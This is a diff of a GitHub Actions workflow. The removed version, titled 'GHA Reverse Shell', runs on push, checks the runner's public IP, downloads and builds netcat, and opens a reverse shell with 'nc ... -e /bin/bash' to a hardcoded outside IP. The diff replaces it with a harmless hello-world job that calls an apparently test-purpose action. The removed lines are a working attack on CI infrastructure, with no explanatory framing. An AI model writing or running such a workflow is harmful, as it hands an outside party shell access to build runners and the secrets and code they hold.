@@ -1,17 +1,14 @@
-name: GHA Reverse Shell
 on: [push]
-jobs: 
-  Recon:
+
+jobs:
+  hello_world_job:
     runs-on: ubuntu-latest
+    name: A job to say hello
     steps:
-      - run: |     
-            curl -s http://whatismyip.akamai.com/
-      - run: |
-           wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
-           tar -xzvf netcat-0.7.1.tar.gz
-           cd netcat-0.7.1
-           ./configure
-           sudo make
-           sudo make install
-      - run: |
-           nc 3.84.116.126 443 -e /bin/bash
+      - uses: actions/checkout@v2
+      - id: foo
+        uses: magnologan/fake-gha@v1
+        with:
+          who-to-greet: 'Mona the Octocat'
+      - run: echo random-number ${{ steps.foo.outputs.random-number }}
+        shell: bash
